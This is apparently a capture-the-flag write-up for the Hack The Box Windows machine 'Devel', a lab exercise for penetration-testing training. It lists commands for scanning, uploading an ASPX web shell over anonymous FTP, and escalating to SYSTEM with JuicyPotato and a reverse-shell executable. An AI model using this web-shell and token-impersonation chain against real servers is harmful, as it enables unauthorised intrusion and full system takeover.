# Devel – Hack The Box
![Status](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Windows](https://img.shields.io/badge/Target-Windows-blue)
![OSCP](https://img.shields.io/badge/OSCP-Recommended-red)

---

## 🧩 Overview
Devel is a Windows IIS machine with a writable FTP directory mapped to the web root. Exploitation involves uploading an ASPX web shell and escalating via impersonation privileges.

---

## 🔍 Enumeration

```bash
nmap -sCV -p- -oN nmap_devel.txt 10.10.10.5
```

Key findings:
- FTP anonymous login allowed
- FTP directory is the IIS web root

---

## 🎯 Initial Foothold – ASPX Webshell Upload

```bash
ftp 10.10.10.5
put shell.aspx
```

Trigger:

```
http://10.10.10.5/shell.aspx
```

---

## 🔼 Privilege Escalation
Use winPEAS:

```powershell
winPEAS.exe
```

Finding: `SeImpersonatePrivilege` → Juicy Potato.

```powershell
JuicyPotato.exe -t * -p reverse.exe -l 9999 -c {CLSID}
```

Get SYSTEM.

---

## 🏆 Flags

```powershell
type C:\Users\babis\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

---

## 📌 Lessons Learned
- Writable FTP → immediate webshell.
- IIS systems often have impersonation tokens to escalate.
